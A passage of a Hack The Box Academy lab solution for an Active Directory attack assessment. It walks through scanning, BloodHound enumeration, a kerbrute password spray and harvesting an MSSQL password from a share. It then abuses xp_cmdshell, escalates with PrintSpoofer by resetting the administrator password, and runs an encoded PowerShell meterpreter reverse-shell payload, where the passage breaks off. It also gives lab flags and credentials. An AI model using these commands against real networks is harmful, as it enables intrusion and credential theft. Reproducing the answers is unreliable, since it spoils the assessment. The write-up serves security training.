sudo nmap -p 88,445,3389 --open 172.16.7.0/24
```

```
┌─[✗]─[htb-student@skills-par01]─[~]
└──╼$ sudo nmap -p 88,445,3389 --open 172.16.7.0/24

Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-21 15:39 EDT
Nmap scan report for inlanefreight.local (172.16.7.3)
Host is up (0.0037s latency).
Not shown: 1 closed tcp port (reset)
PORT    STATE SERVICE
88/tcp  open  kerberos-sec
445/tcp open  microsoft-ds
MAC Address: 00:50:56:B9:85:F7 (VMware)

Nmap scan report for 172.16.7.50
Host is up (0.0027s latency).
Not shown: 1 closed tcp port (reset)
PORT     STATE SERVICE
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
MAC Address: 00:50:56:B9:F7:14 (VMware)

Nmap scan report for 172.16.7.60
Host is up (0.0032s latency).
Not shown: 2 closed tcp ports (reset)
PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 00:50:56:B9:52:1B (VMware)

Nmap scan report for 172.16.7.240
Host is up (0.0024s latency).
Not shown: 2 closed tcp ports (reset)
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Nmap done: 256 IP addresses (4 hosts up) scanned in 28.03 seconds
```

Then, students will find three live hosts and note that `172.16.7.3` is the INLANEFREIGHT.LOCAL domain controller.

Code: sessions

```
172.16.7.3
172.16.7.50
172.16.7.60
```

Students need to run `BloodHound` to survey/scan the domain:

Code: shell

```shell
bloodhound-python -d INLANEFREIGHT.LOCAL -ns 172.16.7.3 -c All -u AB920 -p weasal
```

```
$ bloodhound-python -d INLANEFREIGHT.LOCAL -ns 172.16.7.3 -c All -u AB920 -p weasal

INFO: Found AD domain: inlanefreight.local
INFO: Connecting to LDAP server: DC01.INLANEFREIGHT.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 504 computers
INFO: Connecting to LDAP server: DC01.INLANEFREIGHT.LOCAL
INFO: Found 2902 users
INFO: Connecting to GC LDAP server: DC01.INLANEFREIGHT.LOCAL
INFO: Found 164 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
<SNIP>
```

Students may need to RDP into the ParrotOS jump-box to view the Bloodhound data. Unfortunately, Bloodhound does not reveal the next phase of the attack, thus, students need to enumerate further, running `Nmap` against `172.16.7.50`:

Code: shell

```shell
nmap -A 172.16.7.50
```

```
┌─[✗]─[htb-student@skills-par01]─[~]
└──╼ $nmap -A 172.16.7.50

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-24 10:48 EST
Nmap scan report for 172.16.7.50
Host is up (0.066s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2022-11-24T15:49:16+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=MS01.INLANEFREIGHT.LOCAL
| Not valid before: 2022-11-23T14:36:21
|_Not valid after:  2023-05-25T14:36:21
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: MS01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: MS01.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2022-11-24T15:49:11+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
|_nbstat: NetBIOS name: MS01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:e0:64 (VMware)
| smb2-time: 
|   date: 2022-11-24T15:49:11
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.18 seconds
```

Subsequently, students need to connect to MS01 using RDP, having the opportunity to use drive redirection:

Code: shell

```shell
xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal /drive:share,/home/htb-student/Desktop
```

```
┌─[✗]─[htb-student@skills-par01]─[~]
└──╼ $xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal /drive:share,/home/htb-student/Desktop

[10:55:37:823] [3096:3097] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[10:55:37:823] [3096:3097] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[10:55:37:823] [3096:3097] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[10:55:37:823] [3096:3097] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
```

Now, files that are on the desktop of the ParrotOS jump-box will be accessible as a file share on MS01:

![[HTB Solutions/CAPE/z. images/77a579108953ef0f318a202e52c32e57_MD5.jpg]]

Students will also be able to read the flag from the file "flag.txt", which is in the `C:\` directory:

![[HTB Solutions/CAPE/z. images/72381c4f5bb04d4936b856806500b0ee_MD5.jpg]]

Answer: `aud1t_gr0up_m3mbersh1ps!`

# AD Enumeration & Attacks - Skills Assessment Part II

## Question 4

### "Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain."

Students need to be able to use PowerView and `Kerbrute` from MS01. Using the redirected drive, files on the ParrotOS desktop will be accessible from MS01. Students will begin by first downloading these files to PwnBox:

Code: shell

```shell
wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe
```

```
┌─[us-academy-2]─[10.10.14.96]─[htb-ac330204@htb-9bwbc6vgaj]─[~]
└──╼ [★]$ wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
┌─[us-academy-2]─[10.10.14.96]─[htb-ac330204@htb-9bwbc6vgaj]─[~]
└──╼ [★]$ wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe
```

Then, the files can be transferred to the ParrotOS jump-box using `scp`:

Code: shell

```shell
scp PowerView.ps1 htb-student@10.129.73.75:/home/htb-student/Desktop
scp kerbrute_windows_amd64.exe htb-student@10.129.73.75:/home/htb-student/Desktop
```

```
┌─[us-academy-2]─[10.10.14.96]─[htb-ac330204@htb-9bwbc6vgaj]─[~]
└──╼ [★]$ scp PowerView.ps1 htb-student@10.129.73.75:/home/htb-student/Desktop

htb-student@10.129.73.75's password: 
PowerView.ps1                                 100%  752KB   1.2MB/s   00:00    
┌─[us-academy-2]─[10.10.14.96]─[htb-ac330204@htb-9bwbc6vgaj]─[~]
└──╼ [★]$ scp kerbrute_windows_amd64.exe htb-student@10.129.73.75:/home/htb-student/Desktop

htb-student@10.129.73.75's password: 
kerbrute_windows_amd64.exe                    100% 7810KB   7.7MB/s   00:00
```

Using the previously established RDP session on MS01, students can use the shared drive in File Explorer and transfer `PowerView.ps1` and `Kerbrute` to the Desktop:

![[HTB Solutions/CAPE/z. images/0e51aff7ca61812a1dfbf396ae800e53_MD5.jpg]]

Students need to open PowerShell and navigate to `C:\Users\AB920\Desktop`, to then use `PowerView` to generate a list of domain users:

Code: powershell

```powershell
cd .\Desktop\
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\PowerView.ps1
Get-DomainUser * | Select-Object -ExpandProperty samaccountname | Foreach {$_.TrimEnd()} |Set-Content adusers.txt
Get-Content .\adusers.txt | select -First 10
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\AB920> cd .\Desktop\
PS C:\Users\AB920\Desktop> Set-ExecutionPolicy Bypass -Scope Process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A
PS C:\Users\AB920\Desktop> Import-Module .\PowerView.ps1
PS C:\Users\AB920\Desktop> Get-DomainUser * | Select-Object -ExpandProperty samaccountname | Foreach {$_.TrimEnd()} |Set-Content adusers.txt

PS C:\Users\AB920\Desktop> Get-Content .\adusers.txt | select -First 10

Administrator
Guest
krbtgt
NY340
RO050
FF479
EU303
SX681
AJ725
PH432
```

Subsequently, students need to use `kerbrute.exe` to password spray against the user list generated:

Code: powershell

```powershell
.\kerbrute_windows_amd64.exe passwordspray -d INLANEFREIGHT.LOCAL .\adusers.txt Welcome1
```

```
PS C:\Users\AB920\Desktop> .\kerbrute_windows_amd64.exe passwordspray -d INLANEFREIGHT.LOCAL .\adusers.txt Welcome1

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 11/29/22 - Ronnie Flathers @ropnop

2022/11/29 10:42:57 >  Using KDC(s):
2022/11/29 10:42:57 >   DC01.INLANEFREIGHT.LOCAL:88
2022/11/29 10:43:15 >  [+] VALID LOGIN:  BR086@INLANEFREIGHT.LOCAL:Welcome1
2022/11/29 10:43:15 >  Done! Tested 2901 logins (1 successes) in 18.733 seconds
PS C:\Users\AB920\Desktop>
```

Students will find the user `BR086`.

Answer: `BR086`

# AD Enumeration & Attacks - Skills Assessment Part II

## Question 5

### "What is this user's password?"

Students can refer to the output from `Kerbrute` from the previous question to discover the password `Welcome1`:

Code: powershell

```powershell
.\kerbrute_windows_amd64.exe passwordspray -d INLANEFREIGHT.LOCAL .\adusers.txt Welcome1
```

```
PS C:\Users\AB920\Desktop> .\kerbrute_windows_amd64.exe passwordspray -d INLANEFREIGHT.LOCAL .\adusers.txt Welcome1

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 11/29/22 - Ronnie Flathers @ropnop

2022/11/29 10:42:57 >  Using KDC(s):
2022/11/29 10:42:57 >   DC01.INLANEFREIGHT.LOCAL:88
2022/11/29 10:43:15 >  [+] VALID LOGIN:  BR086@INLANEFREIGHT.LOCAL:Welcome1
2022/11/29 10:43:15 >  Done! Tested 2901 logins (1 successes) in 18.733 seconds
```

Answer: `Welcome1`

# AD Enumeration & Attacks - Skills Assessment Part II

## Question 6

### "Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file?"

Students need to run `Snaffler.exe` on MS01 to hunt for shares, however, first, it must be downloaded to Pwnbox and then transferred to the Parrot OS jump-box:

Code: shell

```shell
wget -q https://github.com/SnaffCon/Snaffler/releases/download/1.0.16/Snaffler.exe
scp Snaffler.exe htb-student@10.129.73.75:/home/htb-student/Desktop
```

```
┌─[us-academy-2]─[10.10.14.96]─[htb-ac330204@htb-9bwbc6vgaj]─[~]
└──╼ [★]$ wget -q https://github.com/SnaffCon/Snaffler/releases/download/1.0.16/Snaffler.exe
┌─[us-academy-2]─[10.10.14.96]─[htb-ac330204@htb-9bwbc6vgaj]─[~]
└──╼ [★]$ scp Snaffler.exe htb-student@10.129.73.75:/home/htb-student/Desktop

htb-student@10.129.73.75's password: 
Snaffler.exe           
```

Then, from MS01, students need to use the shared drive to move `Snaffler.exe` to the Desktop.

Using the previously established PowerShell session, students need use `runas` to launch a new PowerShell session as the `BR086` user (providing the password `Welcome1` when prompted):

Code: powershell

```powershell
runas /netonly /user:INLANEFREIGHT\BR086 powershell
```

```
PS C:\Users\AB920\Desktop> runas /netonly /user:INLANEFREIGHT\BR086 powershell

Enter the password for INLANEFREIGHT\BR086:

Attempting to start powershell as user "INLANEFREIGHT\BR086" ...
```

From the newly created PowerShell session, students to run `Snaffler.exe` to find a SQL connection string in a web.config file:

Code: powershell

```powershell
cd C:\users\AB920\Desktop
.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data
```

```
PS C:\Windows\System32>cd C:\users\AB920\Desktop
PS C:\users\AB920\Desktop>.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data

 .::::::.:::.    :::.  :::.    .-:::::'.-:::::':::    .,:::::: :::::::..
;;;\`    \`\`;;;;,  \`;;;  ;;\`;;   ;;;'''' ;;;'''' ;;;    ;;;;'''' ;;;;\`\`;;;;
'[==/[[[[, [[[[[. '[[ ,[[ '[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[['
  '''    $ $$$ 'Y$c$$c$$$cc$$$c\`$$$'\`\` \`$$$'\`\` $$'     $$""   $$$$$$c
 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b '88bo,
  'YMmMY'  MMM     YM YMM   ''\` 'MM,    'MM,  ''''YUMMM''''YUMMMMMMM   'W'
                         by l0ss and Sh3r4 - github.com/SnaffCon/Snaffler

[INLANEFREIGHT\AB920@MS01] 2022-04-21 21:25:10Z [Share] {Green}<\\DC01.INLANEFREIGHT.LOCAL\Department Shares>(R) Share for department users
[INLANEFREIGHT\AB920@MS01] 2022-04-21 21:25:10Z [Share] {Green}<\\DC01.INLANEFREIGHT.LOCAL\NETLOGON>(R) Logon server share
[INLANEFREIGHT\AB920@MS01] 2022-04-21 21:25:10Z [Share] {Green}<\\DC01.INLANEFREIGHT.LOCAL\SYSVOL>(R) Logon server share
[INLANEFREIGHT\AB920@MS01] 2022-04-21 21:25:11Z [File] {Yellow}<KeepDbConnStringPw|R|connectionstring.{1,200}passw|1.2kB|2022-04-01 15:04:05Z>(\\DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Private\Development\web.config) etEnvironmentVariable\("computername"\)\+'\\SQLEXPRESS;database=master;Integrated\ Security=SSPI;Pooling=true"/>\ \n\ \ \ \ \ \ \ </masterDataServices>\ \ \n\ \ \ \ \ \ \ <connectionStrings>\n\ \ \ \ \ \ \ \ \ \ \ <add\ name="ConString"\ connectionString="Environment\.GetEnvironmentVariable\("computername"\)\+'\\SQLEXPRESS';Initial\ Catalog=Northwind;User\ ID=netdb;Password=D@ta_bAse_adm1n!"/>\n\ \ \ \ \ \ \ </connectionStrings>\n\ \ </system\.web>\n</co
```

From the output of `Snaffler`, students will find the credentials `netdb:D@ta_bAse_adm1n!`.

Answer: `D@ta_bAse_adm1n!`

# AD Enumeration & Attacks - Skills Assessment Part II

## Question 7

### "Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host."

From the ParrotOS jump-box, students need to use `mssqlclient.py` to connect to the `MsSQL` database at 172.16.7.60:

Code: shell

```shell
mssqlclient.py netdb:D@ta_bAse_adm1n\!@172.16.7.60
```

```
$ mssqlclient.py netdb:D@ta_bAse_adm1n\!@172.16.7.60

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL>
--------------------------------------------------------------------------------
```

Subsequently, students need to enable `xp_cmdshell`:

Code: sql

```sql
enable_xp_cmdshell
```

Code: sql

```sql
SQL> enable_xp_cmdshell

[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
```

Students then need to check the user's privileges to discover that `SeImpersonatePrivilege` is enabled:

Code: sql

```sql
xp_cmdshell whoami /priv
```

Code: sql

```sql
SQL> xp_cmdshell whoami /priv

output                                                                             

PRIVILEGES INFORMATION                                                             
----------------------                                                             
Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Students need to escalate privileges using [PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe). Alternatively, students could also likely use `JuicyPotato`, `LonelyPotato`, `RoguePotato`, `EfsPotato`. First, students need to transfer the `PrintSpoofer64.exe` from Pwnbox to the Parrot OS jump-box (`skills-par01`):

Code: shell

```shell
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
scp PrintSpoofer64.exe htb-student@STMIP:/home/htb-student/Desktop
```

```
┌─[us-academy-2]─[10.10.14.96]─[htb-ac330204@htb-9bwbc6vgaj]─[~]
└──╼ [★]$ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe

Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 27136 (26K) [application/octet-stream]
Saving to: ‘PrintSpoofer64.exe’

PrintSpoofer64.exe             100%[=================================================>]  26.50K  --.-KB/s    in 0.07s   

2022-11-29 17:23:23 (357 KB/s) - ‘PrintSpoofer64.exe’ saved [27136/27136]

┌─[us-academy-2]─[10.10.14.96]─[htb-ac330204@htb-9bwbc6vgaj]─[~]
└──╼ [★]$ scp PrintSpoofer64.exe htb-student@10.129.73.75:/home/htb-student/Desktop

htb-student@10.129.73.75's password: 
PrintSpoofer64.exe                                                                     100%   27KB 167.0KB/s   00:00                
```

Then, students need to start a web server from the skills-par01 jump-box:

Code: shell

```shell
python3 -m http.server PWNPO
```

```
┌─[htb-student@skills-par01]─[~/Desktop]
└──╼ $python3 -m http.server 9000

Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
```

Students now need to transfer it to the SQL01 target using `xp_cmdshell` and `certutil.exe`:

Code: sql

```sql
xp_cmdshell certutil -urlcache -split -f "http://172.16.7.240:9000/PrintSpoofer64.exe" c:\windows\temp\PrintSpoofer64.exe
```

Code: sql

```sql
SQL> xp_cmdshell certutil -urlcache -split -f "http://172.16.7.240:9000/PrintSpoofer64.exe" c:\windows\temp\PrintSpoofer64.exe

output                                                                             

----------------------------------------------------------

****  Online  ****                                                                 

  0000  ...                                                                        

  6a00                                                                             

CertUtil: -URLCache command completed successfully. 
```

Students can now use `PrintSpoofer.exe` to run commands as SYSTEM. One option is to catch a reverse shell, or, add a new admin user. However, students will find the simplest way forward is simply to change the password for the current local administrator (setting it to `Welcome1` in here):

Code: sql

```sql
xp_cmdshell c:\windows\temp\PrintSpoofer64.exe -c "net user administrator Welcome1"
```

Code: sql

```sql
SQL> xp_cmdshell c:\windows\temp\PrintSpoofer64.exe -c "net user administrator Welcome1"

output                                                                             

--------------------------------------------------------------------------------   

[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK

NULL
```

At last, students can authenticate as the local administrator to retrieve the flag, using the credentials `administrator:Welcome1`:

Code: shell

```shell
smbclient -U "administrator" \\\\172.16.7.60\\C$
get flag.txt
exit
cat flag.txt
```

```
┌─[htb-student@skills-par01]─[~/Desktop]
└──╼ $smbclient -U "administrator" \\\\172.16.7.60\\C$
Enter WORKGROUP\administrator's password: 

Try "help" to get a list of possible commands.
smb: \> cd Users\Administrator\Desktop\
smb: \Users\Administrator\Desktop\> get flag.txt

getting file \Users\Administrator\Desktop\flag.txt of size 21 as flag.txt (10.3 KiloBytes/sec) (average 10.3 KiloBytes/sec)

smb: \Users\Administrator\Desktop\> exit

┌─[htb-student@skills-par01]─[~/Desktop]
└──╼ $cat flag.txt

s3imp3rs0nate_cl@ssic
```

Answer: `s3imp3rs0nate_cl@ssic`

# AD Enumeration & Attacks - Skills Assessment Part II

## Question 8

### "Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host."

Students first need to prepare a `meterpreter` web\_delivery payload from the ParrotOS jump-box:

Code: shell

```shell
sudo msfconsole -q
search web_delivery
use 1
set payload windows/x64/meterpreter/reverse_tcp
set TARGET 2
set SRVHOST 172.16.7.240
set LHOST 172.16.7.240
exploit
```

```
┌─[htb-student@skills-par01]─[~/Desktop]
└──╼ $sudo msfconsole -q

[msf](Jobs:0 Agents:0) >> search web_delivery

Matching Modules
================

   #  Name                                                        Disclosure Date  Rank       Check  Description
   -  ----                                                        ---------------  ----       -----  -----------
   0  exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
   1  exploit/multi/script/web_delivery                           2013-07-19       manual     No     Script Web Delivery

Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/script/web_delivery

[msf](Jobs:0 Agents:0) >> use 1
[*] Using configured payload python/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set TARGET 2
TARGET => 2
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set SRVHOST 172.16.7.240
SRVHOST => 172.16.7.240
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set LHOST 172.16.7.240
LHOST => 172.16.7.240
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 172.16.7.240:4444 
[*] Using URL: http://172.16.7.240:8080/za1FaPR8o
[*] Server started.
[*] Run the following command on the target machine:
[msf](Jobs:1 Agents:0) exploit(multi/script/web_delivery) >> powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABzAGQAawBfAEoAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAcwBkAGsAXwBKAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAcwBkAGsAXwBKAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAxADYALgA3AC4AMgA0ADAAOgA4ADAAOAAwAC8AegBhADEARgBhAFAAUgA4AG8ALwBhAGIAWQBHADEAagA4AHIAegByAHkATQB4AFEAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4ANwAuADIANAAwADoAOAAwADgAMAAvAHoAYQAxAEYAYQBQAFIAOABvACcAKQApADsA
```

Then, students will run the encoded PowerShell payload from the `xp_cmdshell` `PrintSpoofer`:

Code: sql

```sql
xp_cmdshell c:\windows\temp\PrintSpoofer64.exe -c "powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABzAGQAawBfAEoAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAcwBkAGsAXwBKAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAcwBkAGsAXwBKAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAxADYALgA3AC4AMgA0ADAAOgA4ADAAOAAwAC8AegBhADEARgBhAFAAUgA4AG8ALwBhAGIAWQBHADEAagA4AHIAegByAHkATQB4AFEAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4ANwAuADIANAAwADoAOAAwADgAMAAvAHoAYQAxAEYAYQBQAFIAOABvACcAKQApADsA"
```

Code: sql

```sql
SQL> xp_cmdshell c:\windows\temp\PrintSpoofer64.exe -c "powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABzAGQAawBfAEoAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAcwBkAGsAXwBKAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAcwBkAGsAXwBKAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAxADYALgA3AC4AMgA0ADAAOgA4ADAAOAAwAC8AegBhADEARgBhAFAAUgA4AG8ALwBhAGIAWQBHADEAagA4AHIAegByAHkATQB4AFEAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2A